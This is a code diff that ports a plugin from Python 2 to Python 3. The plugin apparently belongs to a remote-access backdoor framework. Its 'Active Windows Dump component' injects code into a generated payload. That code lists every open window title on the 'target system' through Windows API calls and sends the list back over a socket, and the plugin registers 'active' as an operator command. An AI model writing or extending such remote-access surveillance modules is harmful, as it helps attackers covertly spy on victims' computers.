@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -24,19 +23,19 @@ def active():
             titles.append(buff.value)
         return True
     EnumWindows(EnumWindowsProc(foreach_window), 0)    
-    encoded = ['\\n   - ' + i.encode('ascii','ignore').strip() for i in titles]
+    encoded = ['\\n   - ' + i.encode('ascii','ignore').decode().strip() for i in titles]
     encoded = filter(lambda a: a != '\\n   - ', encoded)
     encoded = list(set(encoded))
     data = '[+]All opened windows : \\n'
     data += ''.join(encoded)
-    s.sendall(data + '\\n')''')
+    s.sendall((data + '\\n').encode())''')
         config.logics.append('''
             elif command == "active":
                 active()''')
         config.help_menu['active'] = 'Shows all open windows on the target system'
     elif option == 'info':
-        print '\nName             : Active Windows Dump component' \
+        print('\nName             : Active Windows Dump component' \
               '\nOS               : Windows' \
               '\nRequired Modules : ctypes' \
               '\nCommands         : active' \
-              '\nDescription      : Shows all open windows on the target system\n'
+              '\nDescription      : Shows all open windows on the target system\n')
